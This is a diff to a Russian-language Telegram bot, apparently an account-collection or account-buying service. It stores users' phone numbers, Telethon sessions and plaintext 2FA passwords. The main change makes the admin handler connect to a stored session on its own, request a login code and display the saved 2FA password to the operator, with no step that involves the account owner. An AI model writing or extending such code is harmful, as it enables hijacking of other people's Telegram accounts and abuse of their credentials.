@@ -179,7 +179,6 @@ async def init_db():
                          """)
         await db.commit()
 
-    # Автоматическое добавление отсутствующих колонок для старых баз данных
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("PRAGMA table_info(accounts)") as cursor:
             columns = [col[1] for col in await cursor.fetchall()]
@@ -491,7 +490,6 @@ async def process_phone(message: Message, state: FSMContext):
                 pass
         return
 
-    # Сохраняем заявку в базу со статусом pending
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
             "INSERT INTO submit_requests (user_id, phone, status, date) VALUES (?, ?, 'pending', datetime('now'))",
@@ -499,7 +497,6 @@ async def process_phone(message: Message, state: FSMContext):
         )
         await db.commit()
 
-    # Оповещаем администраторов о новой заявке
     for admin_id in ADMIN_IDS:
         try:
             await bot.send_message(
@@ -526,7 +523,7 @@ async def process_phone(message: Message, state: FSMContext):
     await state.clear()
 
 
-# Обработка нажатия юзером кнопки «Ввести код»
+# Обработка нажатия юзером кнопки «Ввести код» (из старых заявок)
 @router.callback_query(F.data.startswith("user_enter_code_"))
 async def user_click_enter_code(callback: CallbackQuery, state: FSMContext):
     acc_id = int(callback.data.split("_")[3])
@@ -568,7 +565,6 @@ async def user_click_enter_code(callback: CallbackQuery, state: FSMContext):
         await callback.answer(f"❌ Ошибка: {e}", show_alert=True)
 
 
-# Шаги авторизации для юзера
 @router.message(AuthStates.waiting_for_code)
 async def process_code(message: Message, state: FSMContext):
     try:
@@ -810,7 +806,7 @@ async def cb_admin_panel(callback: CallbackQuery):
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📥 Заявки", callback_data="admin_requests_list")],
-        [InlineKeyboardButton(text="📦 Успешные аккаунты (Запросить код)", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="📦 Успешные аккаунты", callback_data="admin_accounts_list")],
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
@@ -902,7 +898,6 @@ async def adm_request_code_for_submit(callback: CallbackQuery):
     uid, phone = row
     session_name = os.path.join(SESSIONS_DIR, f"session_{uid}_{int(asyncio.get_event_loop().time())}")
 
-    # Сохраняем сессию в базу с пустым паролем
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute(
                 "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, '', datetime('now'))",
@@ -912,7 +907,6 @@ async def adm_request_code_for_submit(callback: CallbackQuery):
         await db.execute("UPDATE submit_requests SET status = 'completed' WHERE id = ?", (req_id,))
         await db.commit()
 
-    # Отправляем пользователю уведомление с кнопкой «Ввести код»
     try:
         user_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="💬 Ввести код", callback_data=f"user_enter_code_{acc_id}")]
@@ -927,7 +921,7 @@ async def adm_request_code_for_submit(callback: CallbackQuery):
         logger.error(f"Не удалось отправить уведомление юзеру {uid}: {e}")
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔑 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
+        [InlineKeyboardButton(text="🔄 Запросить код автоматически", callback_data=f"adm_acc_code_{acc_id}")],
         [InlineKeyboardButton(text="⬅️ В админ-панель", callback_data="admin_panel")]
     ])
 
@@ -950,7 +944,7 @@ async def adm_cancel_request(callback: CallbackQuery):
         inline_keyboard=[[InlineKeyboardButton(text="⬅️ К заявкам", callback_data="admin_requests_list")]]))
 
 
-# --- УСПЕШНЫЕ АККАУНТЫ (ЗАПРОС КОДА КОГДА УГОДНО) ---
+# --- УСПЕШНЫЕ АККАУНТЫ (АВТОМАТИЧЕСКИЙ ЗАПРОС КОДА ДЛЯ АДМИНА) ---
 @router.callback_query(F.data == "admin_accounts_list")
 async def admin_accounts_list(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -977,14 +971,14 @@ async def admin_accounts_list(callback: CallbackQuery):
     kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
-        "📦 **Список успешных аккаунтов**\nНажмите на аккаунт, чтобы **запросить код повторно**:",
+        "📦 **Список успешных аккаунтов**\nНажмите на аккаунт, чтобы **автоматически запросить код**:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
         parse_mode="Markdown"
     )
 
 
 @router.callback_query(F.data.startswith("adm_acc_code_"))
-async def admin_re_request_code(callback: CallbackQuery):
+async def admin_auto_request_code(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
         return
 
@@ -999,33 +993,61 @@ async def admin_re_request_code(callback: CallbackQuery):
         return await callback.answer("❌ Аккаунт не найден в базе данных.", show_alert=True)
 
     uid, phone, session_name, password = row
+    session_file_path = f"{session_name}.session"
 
-    # Отправляем пользователю уведомление с кнопкой «Ввести код»
+    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунту `{phone}` и запрашиваю код...", parse_mode="Markdown")
+
+    client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
     try:
-        user_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💬 Ввести код", callback_data=f"user_enter_code_{acc_id}")]
+        await client.connect()
+
+        # Проверяем, авторизован ли клиент уже
+        if await client.is_user_authorized():
+            me = await client.get_me()
+            await client.disconnect()
+
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🔄 Запросить снова", callback_data=f"adm_acc_code_{acc_id}")],
+                [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
+            ])
+            return await callback.message.edit_text(
+                f"✅ **Аккаунт уже авторизован!**\n\n• Телефон: `{phone}`\n• Имя: {me.first_name}\n• Username: @{me.username or 'отсутствует'}",
+                reply_markup=kb, parse_mode="Markdown"
+            )
+
+        # Если не авторизован, отправляем запрос кода
+        await client.send_code_request(phone)
+        await client.disconnect()
+
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔄 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
+            [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
         ])
-        await bot.send_message(
-            chat_id=uid,
-            text=f"📲 Администратор запросил повторный код подтверждения для вашего номера `{phone}`.\n\nНажмите кнопку ниже, чтобы ввести код:",
-            reply_markup=user_kb,
+
+        pwd_display = f"\n• 🔑 Сохраненный 2FA Пароль: `{password}`" if password else "\n• 🔑 2FA Пароль: Отсутствует"
+
+        await callback.message.edit_text(
+            f"✅ **Код успешно отправлен на аккаунт `{phone}`!**{pwd_display}\n\n"
+            f"Бот ожидает поступления кода (письмо проверится автоматически через почту или вы можете запросить код повторно).",
+            reply_markup=kb,
             parse_mode="Markdown"
         )
+
     except Exception as e:
-        logger.error(f"Не удалось отправить уведомление повторного запроса юзеру {uid}: {e}")
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
-    pwd_display = f"\n• 🔑 Сохраненный 2FA Пароль: `{password}`" if password else "\n• 🔑 2FA Пароль: Отсутствует"
-
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Запросить снова", callback_data=f"adm_acc_code_{acc_id}")],
-        [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
-    ])
-
-    await callback.message.edit_text(
-        f"✅ **Код успешно запрошен повторно!**\n\n• Телефон: `{phone}`{pwd_display}\n• Кнопка отправлена пользователю.",
-        reply_markup=kb,
-        parse_mode="Markdown"
-    )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data=f"adm_acc_code_{acc_id}")],
+            [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
+        ])
+        await callback.message.edit_text(
+            f"❌ **Ошибка при запросе кода для `{phone}`:**\n`{e}`",
+            reply_markup=kb,
+            parse_mode="Markdown"
+        )
 
 
 # --- УПРАВЛЕНИЕ КАРТИНКАМИ ---
